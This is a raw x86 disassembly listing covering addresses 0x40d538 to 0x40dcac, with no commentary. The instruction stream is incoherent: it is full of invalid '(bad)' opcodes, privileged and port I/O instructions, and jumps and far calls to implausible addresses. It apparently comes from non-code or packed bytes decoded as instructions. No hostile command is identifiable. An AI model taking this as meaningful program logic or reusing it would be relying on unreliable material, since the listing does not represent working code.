  40d538:	les    esp,FWORD PTR ds:0xc0a5fbde
  40d53e:	rcr    BYTE PTR [edi-0x5d4daca8],1
  40d544:	gs or  eax,0x83e2a566
  40d54a:	lods   eax,DWORD PTR ds:[esi]
  40d54b:	ret    
  40d54c:	dec    eax
  40d54d:	dec    ebx
  40d54e:	loope  0x40d5b4
  40d550:	inc    eax
  40d551:	cmp    DWORD PTR [edx+0x6a5d47b0],0xe10a4345
  40d55b:	xchg   ecx,eax
  40d55c:	ins    DWORD PTR es:[edi],dx
  40d55d:	push   edi
  40d55e:	sbb    BYTE PTR [ecx+0x8ff35],0xce
  40d565:	inc    eax
  40d566:	xchg   edx,eax
  40d567:	lods   eax,DWORD PTR ds:[esi]
  40d568:	int3   
  40d569:	into   
  40d56a:	xor    esi,DWORD PTR [edx+edx*2+0x32690d65]
  40d571:	dec    ebx
  40d572:	into   
  40d573:	dec    ebx
  40d574:	or     eax,0xe2501615
  40d579:	lds    esp,FWORD PTR [ebp-0x56401c38]
  40d57f:	pop    ebp
  40d580:	mov    ecx,0x509794d4
  40d585:	push   cs
  40d586:	xchg   esi,eax
  40d587:	fdiv   QWORD PTR [esi+0x60]
  40d58a:	sbb    dl,cl
  40d58c:	xlat   BYTE PTR ds:[ebx]
  40d58d:	mov    esp,0xb3ecd259
  40d592:	repz std 
  40d594:	mov    esp,0x2dc7d801
  40d599:	stos   BYTE PTR es:[edi],al
  40d59a:	leave  
  40d59b:	test   DWORD PTR [esi-0x1d],ebx
  40d59e:	fsubp  st(4),st
  40d5a0:	fdivr  DWORD PTR [ecx]
  40d5a2:	pop    ebp
  40d5a3:	dec    esi
  40d5a4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40d5a6:	cmp    BYTE PTR [esi+ebx*8-0x37],dl
  40d5aa:	lods   al,BYTE PTR ds:[esi]
  40d5ab:	div    cl
  40d5ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5ae:	(bad)
  40d5b1:	dec    ebx
  40d5b2:	mov    ah,0xff
  40d5b4:	fisub  WORD PTR [edx+0x7c]
  40d5b7:	lods   al,BYTE PTR ds:[esi]
  40d5b8:	stc    
  40d5b9:	or     BYTE PTR [ebx-0x5a],cl
  40d5bc:	or     dh,BYTE PTR [edx]
  40d5be:	mov    edx,0xe382a54c
  40d5c3:	dec    esp
  40d5c4:	mov    WORD PTR [ebp-0x80],?
  40d5c7:	dec    esi
  40d5c8:	xchg   edi,eax
  40d5c9:	in     eax,0x1
  40d5cb:	fldcw  WORD PTR [edi+0x7aef399]
  40d5d1:	test   eax,0x4e0d334e
  40d5d6:	jnp    0x40d5d0
  40d5d8:	mov    ds:0x69248fba,eax
  40d5dd:	pop    ecx
  40d5de:	jnp    0x40d5fd
  40d5e0:	fld    TBYTE PTR [ecx]
  40d5e2:	mov    ds:0xab73aa27,eax
  40d5e7:	ror    BYTE PTR [esi+0x3df736d],0xb1
  40d5ee:	xchg   ebp,eax
  40d5ef:	pop    eax
  40d5f0:	sub    ecx,DWORD PTR [edi+0x70]
  40d5f3:	dec    ebp
  40d5f4:	enter  0xdd1f,0xa9
  40d5f8:	and    ch,al
  40d5fa:	cmc    
  40d5fb:	fmul   QWORD PTR [ebx+ebp*2]
  40d5fe:	and    ebx,esp
  40d600:	inc    esi
  40d601:	shl    DWORD PTR [edi+0x22d0542b],cl
  40d607:	repz aad 0x68
  40d60a:	std    
  40d60b:	xor    eax,0xea0a2132
  40d610:	addr16 (bad) 
  40d612:	imul   esi,DWORD PTR [ecx],0x8a03332c
  40d618:	les    esp,FWORD PTR [esi+0xb]
  40d61b:	dec    eax
  40d61c:	mov    ah,ch
  40d61e:	push   0x45ec1c5e
  40d623:	mov    eax,ds:0x9799c1af
  40d628:	mov    ds:0x14228d3d,eax
  40d62d:	nop
  40d62e:	xchg   ebp,eax
  40d62f:	test   edi,ecx
  40d631:	jno    0x40d657
  40d633:	rol    eax,1
  40d635:	js     0x40d644
  40d637:	add    eax,0x10a54683
  40d63c:	inc    edx
  40d63d:	mov    dl,0xec
  40d63f:	adc    DWORD PTR [ebx],ecx
  40d641:	outs   dx,DWORD PTR ds:[esi]
  40d642:	call   0xf390b9e
  40d647:	retf   
  40d648:	aaa    
  40d649:	es mov bl,0x4
  40d64c:	push   cs
  40d64d:	fxch   st(4)
  40d64f:	pop    ecx
  40d650:	xor    edi,ecx
  40d652:	neg    DWORD PTR [ebp-0x29]
  40d655:	into   
  40d656:	test   al,0x3c
  40d658:	adc    eax,0xd408b735
  40d65d:	imul   DWORD PTR [edi-0x6d1689e]
  40d663:	inc    edi
  40d664:	sbb    al,0x12
  40d666:	jb     0x40d629
  40d668:	mov    ebx,0xd77517c8
  40d66d:	sbb    ebp,edi
  40d66f:	or     ch,BYTE PTR [edi]
  40d671:	icebp  
  40d672:	cwde   
  40d673:	jle    0x40d655
  40d675:	hlt    
  40d676:	add    DWORD PTR [edx],0x2d
  40d679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d67a:	js     0x40d6cf
  40d67c:	sub    DWORD PTR [ebx+ebp*4],esi
  40d67f:	pop    ss
  40d680:	pushf  
  40d681:	mov    esp,0x6667ff5d
  40d686:	or     al,0xa3
  40d688:	inc    esp
  40d689:	icebp  
  40d68a:	jp     0x40d616
  40d68c:	sbb    BYTE PTR [esi],cl
  40d68e:	ret    0x1a64
  40d691:	loopne 0x40d6d4
  40d693:	and    al,0x28
  40d695:	sbb    cl,BYTE PTR [ebx-0x3d]
  40d698:	enter  0x7e45,0xc9
  40d69c:	push   ecx
  40d69d:	mov    ah,BYTE PTR [edi-0x8dc8356]
  40d6a3:	call   0xce3d:0x8955c5f2
  40d6aa:	xlat   BYTE PTR ds:[ebx]
  40d6ab:	sub    DWORD PTR fs:[edx],esp
  40d6ae:	xchg   DWORD PTR [ecx+0xe],edi
  40d6b1:	cdq    
  40d6b2:	in     eax,dx
  40d6b3:	add    eax,0x7ad9faae
  40d6b8:	push   esp
  40d6b9:	inc    esp
  40d6ba:	add    dl,BYTE PTR [edi+0xa]
  40d6bd:	call   0x4183:0x55520c18
  40d6c4:	or     al,BYTE PTR [ebx+0x2a20c3a1]
  40d6ca:	cmp    DWORD PTR [edx+0x37f9e735],ebp
  40d6d0:	(bad)  [ebx-0x6fe7b5f7]
  40d6d6:	shl    BYTE PTR [esi-0x38],1
  40d6d9:	cmp    eax,0xe3741bad
  40d6de:	jno    0x40d694
  40d6e0:	loope  0x40d754
  40d6e2:	jecxz  0x40d6e5
  40d6e4:	cmp    eax,0xf88c7386
  40d6e9:	js     0x40d673
  40d6eb:	jge    0x40d6e8
  40d6ed:	pop    esi
  40d6ee:	sub    eax,0xd78d6aed
  40d6f3:	aad    0xba
  40d6f5:	outs   dx,DWORD PTR ds:[esi]
  40d6f6:	aad    0x6d
  40d6f8:	outs   dx,BYTE PTR ds:[esi]
  40d6f9:	add    ah,BYTE PTR [ecx-0x6]
  40d6fc:	pop    eax
  40d6fd:	mov    ah,0x44
  40d6ff:	cld    
  40d700:	adc    eax,0x77651c56
  40d705:	(bad)  
  40d706:	jp     0x40d719
  40d708:	outs   dx,BYTE PTR ds:[esi]
  40d709:	dec    ebx
  40d70a:	stos   DWORD PTR es:[edi],eax
  40d70b:	pop    esp
  40d70c:	mov    cl,0x9f
  40d70e:	mov    esi,0xfe7bbe31
  40d713:	jge    0x40d6f7
  40d715:	ret    
  40d716:	sbb    DWORD PTR [ebx-0x27],esi
  40d719:	mov    DWORD PTR [eax+eax*2-0x19e00678],ebx
  40d720:	test   eax,0xf512a7f9
  40d725:	push   ecx
  40d726:	inc    eax
  40d727:	sub    bh,BYTE PTR [ecx+0x6e]
  40d72a:	inc    esi
  40d72b:	ins    BYTE PTR es:[edi],dx
  40d72c:	xor    BYTE PTR [ecx-0x5f975bc0],dl
  40d732:	mov    al,ds:0x364a91ad
  40d737:	push   esp
  40d738:	mov    ah,0xc7
  40d73a:	inc    ecx
  40d73b:	jmp    0xa5362a91
  40d740:	sub    eax,0x3c202c0c
  40d745:	pop    edx
  40d746:	test   al,0x63
  40d748:	cs sbb eax,0x98e5a827
  40d74e:	pop    ds
  40d74f:	pop    eax
  40d750:	fstp   DWORD PTR [esi-0x12d68dc1]
  40d756:	mov    ebx,0x7731d2c5
  40d75b:	dec    esp
  40d75c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d75d:	sbb    al,0xb9
  40d75f:	or     DWORD PTR [ebx-0x5],0x3595a9c9
  40d766:	xor    ecx,eax
  40d768:	mov    WORD PTR ds:0x9fd3e3f1,gs
  40d76e:	or     DWORD PTR [edx+0x409d3d1e],edi
  40d774:	adc    DWORD PTR [eax+0x2527df91],0xc9164a1a
  40d77e:	xchg   esi,eax
  40d77f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d780:	in     al,0x7a
  40d782:	and    BYTE PTR [ebx],0x82
  40d785:	or     al,0x26
  40d787:	out    dx,al
  40d788:	iret   
  40d789:	push   0xffffffda
  40d78b:	and    eax,0x78
  40d78e:	jb     0x40d7b0
  40d790:	sub    dl,BYTE PTR [edi+0x45]
  40d793:	cs dec edi
  40d795:	ds ins DWORD PTR es:[edi],dx
  40d797:	xor    BYTE PTR [edx-0x18b4e411],cl
  40d79d:	out    0xa0,al
  40d79f:	lea    esp,[eax]
  40d7a1:	lods   al,BYTE PTR ds:[esi]
  40d7a2:	xor    bh,cl
  40d7a4:	mov    ds:0xe54d4e61,al
  40d7a9:	xchg   ecx,eax
  40d7aa:	inc    edx
  40d7ab:	mov    WORD PTR [ebp+edi*4+0x24bc452a],cs
  40d7b2:	mov    esi,0x5bee43cd
  40d7b7:	int    0x58
  40d7b9:	and    al,0xad
  40d7bb:	popf   
  40d7bc:	or     DWORD PTR [edi+0x7507d80],edx
  40d7c2:	mov    dl,0xfc
  40d7c4:	fmul   QWORD PTR [edi]
  40d7c6:	popa   
  40d7c7:	ss iret 
  40d7c9:	mov    gs,WORD PTR [edx-0x1196a4fa]
  40d7cf:	jae    0x40d836
  40d7d1:	loope  0x40d7ae
  40d7d3:	xlat   BYTE PTR ds:[ebx]
  40d7d4:	lahf   
  40d7d5:	jle    0x40d7ed
  40d7d7:	cmp    DWORD PTR [eax-0x15],ebx
  40d7da:	pop    ss
  40d7db:	ds push es
  40d7dd:	mov    edx,0x24690b1
  40d7e2:	shr    BYTE PTR [ebx],cl
  40d7e4:	adc    dl,bl
  40d7e6:	imul   ebp,DWORD PTR [edx-0xe],0xfd20eeb2
  40d7ed:	push   esi
  40d7ee:	cwde   
  40d7ef:	test   eax,0xecf1288d
  40d7f4:	mov    DWORD PTR [ebp-0x37],edi
  40d7f7:	xor    DWORD PTR [edx],edx
  40d7f9:	adc    ebp,DWORD PTR es:[ebp-0x275e4d98]
  40d800:	call   0x525a:0x9545eec9
  40d807:	push   esi
  40d808:	push   esi
  40d809:	add    bh,BYTE PTR [ebx]
  40d80b:	or     cl,BYTE PTR [ebx]
  40d80d:	add    esp,edx
  40d80f:	cld    
  40d810:	xchg   DWORD PTR es:[edx-0x5f],edx
  40d814:	xchg   ebx,eax
  40d815:	in     eax,dx
  40d816:	in     eax,0xe2
  40d818:	and    DWORD PTR [edi],esp
  40d81a:	in     al,dx
  40d81b:	test   edi,ebx
  40d81d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d81e:	dec    esi
  40d81f:	sub    al,0x93
  40d821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d822:	xchg   edi,eax
  40d823:	ss sub al,0x3a
  40d826:	out    0x83,eax
  40d828:	jae    0x40d85a
  40d82a:	sti    
  40d82b:	pusha  
  40d82c:	mov    ds:0x98822864,eax
  40d831:	mov    edx,0x8b4f4f86
  40d836:	mov    ebx,0x25cf23b3
  40d83b:	iret   
  40d83c:	test   al,0x2b
  40d83e:	or     BYTE PTR [edx],bl
  40d840:	shr    ah,1
  40d842:	mov    esi,0x2997eda8
  40d847:	stos   BYTE PTR es:[edi],al
  40d848:	xor    eax,0x7fa4c466
  40d84d:	imul   edi,DWORD PTR [edx+ebx*8-0x41b8b6e9],0xffffffc8
  40d855:	push   es
  40d856:	pop    esi
  40d857:	nop
  40d858:	add    ebx,DWORD PTR ss:[esi-0x1c]
  40d85c:	sar    eax,0x32
  40d85f:	or     DWORD PTR [eax+0x69f5ac4b],ebx
  40d865:	in     eax,dx
  40d866:	dec    esi
  40d867:	xor    ch,ch
  40d869:	lock iret 
  40d86b:	call   0xc26da938
  40d870:	push   edi
  40d871:	cmc    
  40d872:	aas    
  40d873:	test   DWORD PTR [edx-0x2f],edi
  40d876:	popa   
  40d877:	aam    0x6e
  40d879:	stc    
  40d87a:	ins    DWORD PTR es:[edi],dx
  40d87b:	and    BYTE PTR [edx],dl
  40d87d:	push   edx
  40d87e:	nop
  40d87f:	pushf  
  40d880:	jnp    0x40d8c7
  40d882:	mov    WORD PTR [eax+0x5a],ss
  40d885:	sub    al,0xfa
  40d887:	sahf   
  40d888:	xchg   edi,eax
  40d889:	(bad)  
  40d88a:	xchg   esi,eax
  40d88b:	mov    DWORD PTR [ebp+0xc],0xc7a417d7
  40d892:	js     0x40d866
  40d894:	lds    eax,FWORD PTR [ebx-0x10]
  40d897:	mov    dl,0x58
  40d899:	test   BYTE PTR [eax+0x4d2a9d6d],dl
  40d89f:	jmp    0x38ca8e34
  40d8a4:	test   DWORD PTR ds:0x6f7cfcfa,esp
  40d8aa:	data16 adc bl,BYTE PTR [esi]
  40d8ad:	fwait
  40d8ae:	or     BYTE PTR [eax],ah
  40d8b0:	loop   0x40d889
  40d8b2:	inc    esp
  40d8b3:	ja     0x40d8ea
  40d8b5:	mov    bl,0x86
  40d8b7:	(bad)  
  40d8b8:	in     al,dx
  40d8b9:	mov    esp,0xf393c1b1
  40d8be:	icebp  
  40d8bf:	in     al,0x74
  40d8c1:	shl    ecx,cl
  40d8c3:	jge    0x40d899
  40d8c5:	jmp    0x40d87a
  40d8c7:	jecxz  0x40d893
  40d8c9:	outs   dx,BYTE PTR ds:[esi]
  40d8ca:	retf   
  40d8cb:	je     0x40d8e1
  40d8cd:	mov    edi,0x7007a
  40d8d2:	mov    dh,0x71
  40d8d4:	aas    
  40d8d5:	nop
  40d8d6:	iret   
  40d8d7:	sub    DWORD PTR [ecx+0xbe49748],ecx
  40d8dd:	pop    esi
  40d8de:	push   es
  40d8df:	mov    al,BYTE PTR [ebp+0x1361094c]
  40d8e5:	sub    eax,0x7a0c3309
  40d8ea:	dec    ebx
  40d8eb:	int    0x34
  40d8ed:	inc    ebp
  40d8ee:	mov    al,BYTE PTR [edx+ebp*8]
  40d8f1:	add    esp,DWORD PTR [edx*8-0x6139007d]
  40d8f8:	les    esp,FWORD PTR [esi]
  40d8fa:	dec    edx
  40d8fb:	jno    0x40d8ca
  40d8fd:	inc    ebp
  40d8fe:	or     BYTE PTR [eax],ch
  40d900:	adc    DWORD PTR [ebx],edx
  40d902:	stos   DWORD PTR es:[edi],eax
  40d903:	adc    BYTE PTR [edx],0x3b
  40d906:	fisubr WORD PTR [edx+edi*2]
  40d909:	lods   eax,DWORD PTR ds:[esi]
  40d90a:	inc    edi
  40d90b:	pop    eax
  40d90c:	test   BYTE PTR [eax],ch
  40d90e:	mov    WORD PTR [edi-0x96c818],ss
  40d914:	popa   
  40d915:	loope  0x40d8bc
  40d917:	and    dl,BYTE PTR [ebp+0x73]
  40d91a:	or     BYTE PTR fs:[ebx+edx*8+0x28],cl
  40d91f:	pusha  
  40d920:	sub    al,0x4e
  40d922:	int    0xb
  40d924:	mov    dl,0xa6
  40d926:	(bad)  
  40d927:	push   ax
  40d929:	dec    BYTE PTR [edx+0x45107120]
  40d92f:	cmp    bl,BYTE PTR [ebp+0xcd1635b]
  40d935:	es mov ebx,0x8efe03a0
  40d93b:	fcomp  DWORD PTR ds:0x9aaa8e55
  40d941:	jno    0x40d942
  40d943:	loope  0x40d92c
  40d945:	cmp    al,0xe3
  40d947:	pop    ebp
  40d948:	xlat   BYTE PTR ds:[ebx]
  40d949:	loop   0x40d967
  40d94b:	jge    0x40d9b8
  40d94d:	cdq    
  40d94e:	outs   dx,BYTE PTR ds:[esi]
  40d94f:	rcr    esp,cl
  40d951:	xor    DWORD PTR [eax+0x61d85156],ebx
  40d957:	push   0xe7dcebce
  40d95c:	out    dx,al
  40d95d:	adc    al,0xf7
  40d95f:	outs   dx,BYTE PTR ds:[esi]
  40d960:	fnop   
  40d962:	xor    DWORD PTR [edx+0x71fd178a],0xffffffdd
  40d969:	sbb    al,0xf6
  40d96b:	repnz mov ebp,0xe45f145
  40d971:	and    esp,ebx
  40d973:	hlt    
  40d974:	scas   al,BYTE PTR es:[edi]
  40d975:	les    eax,FWORD PTR [ebx-0x14]
  40d978:	jmp    FWORD PTR [ecx]
  40d97a:	jle    0x40d9b0
  40d97c:	loopne 0x40d959
  40d97e:	pop    edx
  40d97f:	retf   
  40d980:	call   0x289b:0x34a7743a
  40d987:	ja     0x40d9d8
  40d989:	retf   0x64e5
  40d98c:	pop    edi
  40d98d:	outs   dx,BYTE PTR ds:[esi]
  40d98e:	jbe    0x40d9ab
  40d990:	aas    
  40d991:	pop    eax
  40d992:	je     0x6f383132
  40d998:	xchg   ebp,eax
  40d999:	ret    0xa96
  40d99c:	jecxz  0x40d924
  40d99e:	cmp    dh,ah
  40d9a0:	(bad)  
  40d9a1:	aam    0x80
  40d9a3:	cmp    ah,dh
  40d9a5:	mov    BYTE PTR [esi],bl
  40d9a7:	fimul  WORD PTR [eax+0x52e98efa]
  40d9ad:	scas   al,BYTE PTR es:[edi]
  40d9ae:	sbb    ebp,esp
  40d9b0:	ret    0x12de
  40d9b3:	popf   
  40d9b4:	mov    eax,ds:0x3c050586
  40d9b9:	aam    0x3d
  40d9bb:	sahf   
  40d9bc:	adc    eax,0x4d4d5677
  40d9c1:	adc    BYTE PTR [ecx-0x9],bh
  40d9c4:	xchg   dl,ah
  40d9c6:	push   ss
  40d9c7:	xchg   ecx,eax
  40d9c8:	pop    edi
  40d9c9:	add    bl,BYTE PTR [ecx+0x66]
  40d9cc:	push   cs
  40d9cd:	dec    edx
  40d9ce:	and    eax,0x37156629
  40d9d3:	adc    bl,BYTE PTR [edi+0x2d2a14c7]
  40d9d9:	dec    ecx
  40d9da:	int3   
  40d9db:	shr    edx,1
  40d9dd:	cmp    al,0x18
  40d9df:	push   ebx
  40d9e0:	fcmovu st,st(5)
  40d9e2:	into   
  40d9e3:	cmp    eax,0x855c330d
  40d9e8:	push   esi
  40d9e9:	bound  ebp,QWORD PTR [edx-0x40]
  40d9ec:	xchg   edi,eax
  40d9ed:	push   ecx
  40d9ee:	fnstenv [ebx]
  40d9f0:	jne    0x40da51
  40d9f2:	and    DWORD PTR [ecx-0x5bb1ce99],ecx
  40d9f8:	push   ecx
  40d9f9:	out    0x25,eax
  40d9fb:	jae    0x40da25
  40d9fd:	daa    
  40d9fe:	add    ecx,DWORD PTR [esi]
  40da00:	call   0xc723e7c3
  40da05:	pop    ecx
  40da06:	mov    bl,0xab
  40da08:	xor    dh,BYTE PTR [esi*4-0x5b9e0710]
  40da0f:	mov    edx,0x2907ae7
  40da14:	ss and eax,0x29bcc715
  40da1a:	sub    al,0x2e
  40da1c:	jno    0x40d9ee
  40da1e:	cmc    
  40da1f:	xchg   BYTE PTR [esi],al
  40da21:	lds    eax,FWORD PTR ds:0x4dc21cce
  40da27:	and    BYTE PTR [ecx+0x2c],dl
  40da2a:	lods   al,BYTE PTR ds:[esi]
  40da2b:	or     DWORD PTR [ebx],edi
  40da2d:	arpl   WORD PTR [ecx-0x46],ax
  40da30:	sub    BYTE PTR [ebp-0x6a6ff042],ch
  40da36:	arpl   WORD PTR [edx+edi*2+0x287c8df9],cx
  40da3d:	mul    edx
  40da3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da40:	daa    
  40da41:	or     DWORD PTR [ecx+0x29765199],ebp
  40da47:	ss mov edi,0x7bd0302c
  40da4d:	pop    ss
  40da4e:	push   ebp
  40da4f:	pop    ecx
  40da50:	pop    ss
  40da51:	jl     0x40da20
  40da53:	xor    ch,BYTE PTR [edi+0x26634b7a]
  40da59:	outs   dx,BYTE PTR ds:[esi]
  40da5a:	pushf  
  40da5b:	inc    esp
  40da5c:	push   0x64
  40da5e:	dec    edx
  40da5f:	mov    fs,WORD PTR [edi+0x5837501b]
  40da65:	xlat   BYTE PTR ds:[ebx]
  40da66:	jg     0x40d9f6
  40da68:	fcmovne st,st(5)
  40da6a:	xchg   ebx,eax
  40da6b:	inc    eax
  40da6c:	test   al,0xc7
  40da6e:	fst    DWORD PTR [esi]
  40da70:	in     eax,0x8
  40da72:	clc    
  40da73:	xor    ebp,ebx
  40da75:	pop    ss
  40da76:	pop    esp
  40da77:	add    al,0x52
  40da79:	fs ret 
  40da7b:	mov    BYTE PTR [edi],cl
  40da7d:	repnz pop ebp
  40da7f:	ins    DWORD PTR es:[edi],dx
  40da80:	adc    al,0x13
  40da82:	dec    ebp
  40da83:	adc    WORD PTR [eax+0x37],sp
  40da87:	push   edi
  40da88:	(bad)  
  40da89:	xlat   BYTE PTR ds:[ebx]
  40da8a:	arpl   WORD PTR [esi],dx
  40da8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da8d:	inc    eax
  40da8e:	mov    ebx,0x4e785ef1
  40da93:	push   es
  40da94:	xchg   ebx,eax
  40da95:	inc    esp
  40da96:	xor    cl,BYTE PTR [edi+0x4b]
  40da99:	lds    ebp,FWORD PTR cs:[esi-0x4cc405d2]
  40daa0:	call   0x59e8:0x68cfd4f0
  40daa7:	sub    DWORD PTR [edx+0x28],edx
  40daaa:	cmp    al,0x40
  40daac:	shr    BYTE PTR [ecx-0x61],1
  40daaf:	dec    ecx
  40dab0:	rol    DWORD PTR cs:[edi-0x5c225cc7],0xf7
  40dab8:	test   BYTE PTR [ebx+0x6c],ch
  40dabb:	push   ss
  40dabc:	push   eax
  40dabd:	jecxz  0x40da9f
  40dabf:	mov    al,0xbc
  40dac1:	sahf   
  40dac2:	jge    0x40da4f
  40dac4:	je     0x40da7c
  40dac6:	fst    st(0)
  40dac8:	jp     0x40daff
  40daca:	inc    esi
  40dacb:	repz test eax,0x9756c26b
  40dad1:	aad    0x9b
  40dad3:	das    
  40dad4:	xchg   ecx,eax
  40dad5:	out    dx,al
  40dad6:	data16 mov WORD PTR [edi+edx*8],cs
  40dada:	inc    ebx
  40dadb:	imul   esp,DWORD PTR [ecx],0xffffffa9
  40dade:	xchg   ecx,eax
  40dadf:	test   al,0xd0
  40dae1:	sub    eax,0x8cc22966
  40dae6:	test   al,0x85
  40dae8:	pop    es
  40dae9:	adc    edx,esp
  40daeb:	lock leave 
  40daed:	in     eax,0x76
  40daef:	add    al,cl
  40daf1:	jecxz  0x40db18
  40daf3:	mov    es,WORD PTR [edi-0x30187113]
  40daf9:	test   BYTE PTR [ebx+eax*4],0x81
  40dafd:	mul    BYTE PTR ds:0x39f31fa7
  40db03:	(bad)  
  40db05:	mov    WORD PTR [ebp-0x48],gs
  40db08:	adc    eax,0xdae8d306
  40db0d:	xor    esp,DWORD PTR [eax]
  40db0f:	ret    
  40db10:	fdivp  st(5),st
  40db12:	stc    
  40db13:	mov    al,ds:0x160290b8
  40db18:	cmp    eax,0x71da8fe
  40db1d:	sahf   
  40db1e:	jb     0x40db3a
  40db20:	popaw  
  40db22:	(bad)  
  40db23:	in     eax,0xe0
  40db25:	out    dx,eax
  40db26:	retf   
  40db27:	in     eax,0xc8
  40db29:	addr16 cli 
  40db2b:	(bad)  
  40db2c:	push   ebx
  40db2d:	ins    BYTE PTR es:[edi],dx
  40db2e:	inc    DWORD PTR [edi+0x1eefaa6f]
  40db34:	adc    eax,0xead12671
  40db39:	xor    bh,BYTE PTR [edx+0x3a3cbaef]
  40db3f:	outs   dx,DWORD PTR ds:[esi]
  40db40:	hlt    
  40db41:	mov    WORD PTR [ecx+0x22533039],ss
  40db47:	les    ebp,FWORD PTR ds:0xaa96ecea
  40db4d:	adc    BYTE PTR [eax+ebp*8-0x2a],cl
  40db51:	xchg   edx,eax
  40db52:	xchg   esp,eax
  40db53:	mov    edx,0xffe3b66
  40db58:	and    ch,BYTE PTR [ecx+0x231861a8]
  40db5e:	jne    0x40db81
  40db60:	call   0x4388:0xfd455a33
  40db67:	cwde   
  40db68:	add    eax,0x1aa06457
  40db6d:	int    0xc
  40db6f:	je     0x40daf6
  40db71:	shl    BYTE PTR [ebp+eax*8-0x760f7680],1
  40db78:	mov    esp,0xaf9e5601
  40db7d:	mov    esp,0x5f37b8b7
  40db82:	pop    ss
  40db83:	fstp   st(1)
  40db85:	add    DWORD PTR [ebx-0x28],edi
  40db88:	(bad)
  40db8c:	xchg   BYTE PTR [edi],al
  40db8e:	xchg   ebp,eax
  40db8f:	inc    ebx
  40db90:	nop
  40db91:	xchg   esp,eax
  40db92:	pop    eax
  40db93:	dec    eax
  40db94:	xchg   ebx,eax
  40db95:	jmp    0xeebfac01
  40db9a:	ror    esi,1
  40db9c:	pop    esi
  40db9d:	push   ebx
  40db9e:	out    0x2c,eax
  40dba0:	fisub  DWORD PTR [ecx-0x5a]
  40dba3:	or     ecx,DWORD PTR [esi+0x4c]
  40dba6:	xchg   ebx,eax
  40dba7:	in     eax,dx
  40dba8:	sbb    dl,BYTE PTR [edi-0x5a103557]
  40dbae:	jge    0x40db35
  40dbb0:	dec    edi
  40dbb1:	(bad)  
  40dbb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbb3:	push   ebp
  40dbb4:	stc    
  40dbb5:	test   eax,0x13abe4f1
  40dbba:	jge    0x40db8f
  40dbbc:	jne    0x40db80
  40dbbe:	pop    ecx
  40dbbf:	cmp    cl,BYTE PTR [ebp+0x4047016c]
  40dbc5:	das    
  40dbc6:	ror    bl,0x3e
  40dbc9:	adc    eax,DWORD PTR [esi]
  40dbcb:	xor    DWORD PTR [esi+0x3e],edx
  40dbce:	loope  0x40dbff
  40dbd0:	loope  0x40dc21
  40dbd2:	js     0x40dbe1
  40dbd4:	sbb    eax,0x2ef18687
  40dbd9:	pop    esp
  40dbda:	sahf   
  40dbdb:	push   edx
  40dbdc:	ins    DWORD PTR es:[edi],dx
  40dbdd:	sub    eax,0xf20344b1
  40dbe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dbe3:	mov    ebp,0xe99cd3b2
  40dbe8:	xchg   edi,eax
  40dbe9:	fwait
  40dbea:	jae    0x40db86
  40dbec:	iret   
  40dbed:	pop    ss
  40dbee:	add    esp,DWORD PTR [ecx+0x4c1cb26e]
  40dbf4:	add    ebx,DWORD PTR [ebx+0x6e]
  40dbf7:	mov    ebp,0xb47f3740
  40dbfc:	xchg   esp,eax
  40dbfd:	add    DWORD PTR [ebx],ecx
  40dbff:	(bad)  
  40dc01:	addr16 sti 
  40dc03:	jns    0x40db8e
  40dc05:	or     DWORD PTR [ebx],ebp
  40dc07:	js     0x40dbc9
  40dc09:	push   cs
  40dc0a:	imul   ebp,DWORD PTR [ebp-0x7bf94e83],0xa2a43874
  40dc14:	es clc 
  40dc16:	js     0x40dc40
  40dc18:	xchg   edi,eax
  40dc19:	jl     0x40dc57
  40dc1b:	lock test DWORD PTR [edi-0x27ecb266],0x6e2c16ab
  40dc26:	pop    ecx
  40dc27:	sbb    DWORD PTR [edi+0x5b49e0cf],esp
  40dc2d:	aam    0x56
  40dc2f:	fisubr WORD PTR [eax]
  40dc31:	add    dl,BYTE PTR [eax]
  40dc33:	pop    eax
  40dc34:	or     eax,0xd48700f9
  40dc39:	xor    al,0xad
  40dc3b:	add    eax,0xdfe73a94
  40dc40:	xchg   bh,al
  40dc42:	sar    BYTE PTR [eax],cl
  40dc44:	cmp    eax,0xc5f4cf9c
  40dc49:	fstp   TBYTE PTR [esi]
  40dc4b:	push   es
  40dc4c:	xor    edi,DWORD PTR [edx+edx*8]
  40dc4f:	scas   eax,DWORD PTR es:[edi]
  40dc50:	xchg   edx,eax
  40dc51:	inc    esi
  40dc52:	sahf   
  40dc53:	fsub   st(1),st
  40dc55:	lea    esi,[ecx+eax*1-0x20]
  40dc59:	cs js  0x40dc0c
  40dc5c:	addr16 xor eax,esp
  40dc5f:	(bad)  
  40dc60:	xchg   ecx,eax
  40dc61:	lods   eax,DWORD PTR ds:[esi]
  40dc62:	jl     0x40dc1d
  40dc64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc65:	xor    ah,BYTE PTR [ebx-0x714a9385]
  40dc6b:	aad    0x4e
  40dc6d:	dec    edx
  40dc6e:	addr16 (bad) 
  40dc70:	mov    esi,0x2bd36e5e
  40dc75:	jg     0x40dc96
  40dc77:	push   cs
  40dc78:	pop    es
  40dc79:	gs nop
  40dc7b:	adc    DWORD PTR [ebx+0x66],esp
  40dc7e:	es clc 
  40dc80:	shl    bl,1
  40dc82:	test   BYTE PTR [ebx-0x71],ch
  40dc85:	mov    al,ds:0x79deb377
  40dc8a:	push   esp
  40dc8b:	push   ebx
  40dc8c:	in     al,0x4f
  40dc8e:	or     eax,ecx
  40dc90:	call   0x9827:0xfc19f550
  40dc97:	aaa    
  40dc98:	xor    BYTE PTR [ebx],ah
  40dc9a:	jge    0x40dcfa
  40dc9c:	popa   
  40dc9d:	jge    0x40dc78
  40dc9f:	leave  
  40dca0:	daa    
  40dca1:	pop    edi
  40dca2:	or     al,0x57
  40dca4:	aam    0x3b
  40dca6:	ss xchg esp,eax
  40dca8:	les    esi,FWORD PTR [edi+0x42]
  40dcab:	scas   eax,DWORD PTR es:[edi]
  40dcac:	pop    edx
